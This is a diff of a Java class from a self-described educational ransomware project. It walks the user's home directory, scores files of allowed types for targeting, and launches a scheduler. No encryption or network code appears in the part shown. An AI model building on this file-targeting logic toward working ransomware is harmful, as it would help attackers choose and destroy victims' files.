@@ -9,7 +9,7 @@
 
 Copyright (c) 2019 Kyra Mozley
 Created on 18/07/19
-Version 1.0
+Version 2.0
 
 Disclaimer: This project is purely for educational purposes 
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
@@ -22,12 +22,7 @@ package RansomeWare;
 
 import java.io.*;
 import java.io.File;
-import java.text.SimpleDateFormat;
 import java.util.*;
-import java.util.concurrent.TimeUnit;
-
-import static java.util.Map.Entry.comparingByValue;
-import static java.util.stream.Collectors.toMap;
 
 
 public class FindFiles {
@@ -37,8 +32,11 @@ public class FindFiles {
     List<String> allowedFiles;
     List<String> avoidDir;
 
+    FileScore fs;
+
 
     public void FindFiles() throws Exception {
+        fs = new FileScore();
         //Use System Property rather than C:\\ to make it OS independent
 
         String home = System.getProperty("user.home");
@@ -57,6 +55,10 @@ public class FindFiles {
         //Traverse the file system
         traverse(home);
         fileWriter.close();
+
+        //launch scheduler
+        Scheduler s = new Scheduler();
+        s.function();
     }
 
     public void traverse(String path) throws Exception {
@@ -78,22 +80,13 @@ public class FindFiles {
 
                 //if file extension is allowed, write to file with last mod
                 if(allowedFiles.contains("." + fileType.toUpperCase())) {
-                    long lastmod = f.lastModified();
-                    fileWriter.write(f.getAbsolutePath() + ", " + lastmod);
-                    System.out.println(f.getAbsolutePath() + ", " + lastmod);
+                    double beta = fs.calculateBeta(f);
+                    fileWriter.write(f.getAbsolutePath() + ", " + beta);
+                    System.out.println(f.getAbsolutePath() + ", " + beta);
                     fileWriter.newLine();
                 }
             }
         }
-    }
-
-
-
-    public static void main(String[] args) throws Exception {
-        FindFiles ff = new FindFiles();
-        ff.FindFiles();
-        Scheduler s = new Scheduler();
-        s.function();
     }
 
 }
